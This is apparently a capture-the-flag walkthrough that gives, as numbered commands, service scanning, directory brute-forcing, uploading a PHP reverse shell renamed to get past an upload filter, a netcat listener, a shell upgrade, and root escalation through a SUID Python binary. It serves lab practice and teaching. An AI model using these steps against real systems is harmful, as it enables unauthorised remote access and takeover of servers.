1. **Scan target with Nmap**
    

`nmap -sV -T4 <TARGET_IP>`

- Scans the target IP for open ports and service versions.
    

2. **Find hidden directories with GoBuster**
    

`gobuster dir -u http://<TARGET_IP> -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`

- Brute-forces URLs on the web server to find hidden directories like `/panel/`.
    

---

### **Task 3 – Getting a Shell**

3. **Clone PHP reverse shell repository**
    

`git clone https://github.com/pentestmonkey/php-reverse-shell`

- Downloads a ready-made PHP reverse shell script.
    

4. **List directory contents**
    

`ls`

- Checks which files/folders exist.
    

5. **Enter the cloned repository**
    

`cd php-reverse-shell`

- Moves into the folder containing the PHP reverse shell.
    

6. **Open the PHP reverse shell file in a text editor**
    

`nano php-reverse-shell.php`

- Opens the file to edit the IP and port for the reverse shell.
    

7. **Bypass file upload restrictions by renaming the file**
    

`cp php-reverse-shell.php php-reverse-shell.php5 ls`

- Copies and renames the PHP file so the web server allows upload.
    

8. **Set up a Netcat listener on your machine**
    

`nc -lvnp <LISTENING_PORT>`

- Waits for the reverse shell to connect back.
    

9. **Access the uploaded PHP shell in a browser**
    

`http://<TARGET_IP>/uploads/shell.php5`

- Triggers the reverse shell on the server.
    

10. **Upgrade limited shell to interactive shell**
    

`python -c 'import pty; pty.spawn("/bin/bash")'`

- Gives a proper terminal experience for commands.
    

11. **Find user flag**
    

`find / -type f -name user.txt 2>/dev/null`

- Searches the whole filesystem for `user.txt`.
    

12. **Display the user flag**
    

`cat /var/www/user.txt`

- Shows the flag.
    

---

### **Task 4 – Privilege Escalation**

13. **Find root-owned SUID files**
    

`find / -type f -user root -perm -4000 2>/dev/null`

- Finds files owned by root that could allow privilege escalation.
    

14. **Exploit SUID Python binary**
    

`python -c 'import os; os.execl("/bin/sh", "sh", "-p")'`

- Opens a root shell using the SUID Python binary.
    

15. **Navigate to root folder and get root flag**
    

`cd /root ls cat root.txt`

- Moves to the root home folder and reads the root flag.